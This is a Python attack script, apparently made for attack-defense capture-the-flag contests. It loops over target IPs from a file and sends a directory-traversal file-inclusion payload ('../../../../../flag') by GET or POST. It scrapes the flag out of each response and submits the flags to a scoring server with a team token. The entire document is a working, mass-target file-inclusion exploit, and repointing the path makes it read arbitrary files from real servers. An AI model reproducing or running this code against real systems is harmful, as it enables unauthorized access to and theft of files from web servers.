#!/usr/bin/python3
#By purplet
import requests

def include_contain_flag(include_addr):
    try:
        if(int(type)==1):
            res=requests.get(include_addr,payload,timeout=2)
        else:
            res=requests.post(include_addr,payload,timeout=2)
        if res.status_code == 200:
            result = include_addr + " include contain flag is "+str(res.text.split('<!-- banner')[0])#最后一段根据实际情况修改
            print(result)
            flag.write(str(res.text.split('<!-- banner')[0])+'\n')#文件写入同上修改
        else:
            print(include_addr+" include contain flag fail")
    except:
        print(include_addr + " connect fail")
        
def submit_Flag(flag_url):
    try:
        res=requests.post(flag_url,data,timeout=1)
        if res.status_code == 200:
            print("submit flag success--")
        else:
            print("submit flag fail")
    except:
        print(flag_url + " connect fail")

def prepare_get_post():
    global payload
    payload =  {passwd: '../../../../../flag'}#文件包含Payload
    for i in url_head:
        include_addrs = i.strip()+include_addr
        include_contain_flag(include_addrs)
    flag.close()
    include_flag = open('includeflag.txt',"r")
    include_flag_list = include_flag.readlines()
    flag_server = input("[+] 请输入提交flag的网址Input example:http://192.168.194.147:9090/\n")
    token = input("[+] 请输入自己队伍的token：")
    for j in include_flag_list:
        global data
        data = {
                'flag':j.strip(),
                'token':token
        }
        submit_Flag(flag_server)
if __name__ == '__main__':
    f = open('ip.txt','r')
    url_head = f.readlines()
    flag = open("includeflag.txt","w")
    print("[+] 请输入文件包含地址Input example:/about.php")
    include_addr = input()
    print("[+] 请输入参数Input example：file")
    global passwd
    passwd = input("")
    print("[+] 请选择类型 1.GET 2.POST")
    global type
    type = input("")
    prepare_get_post()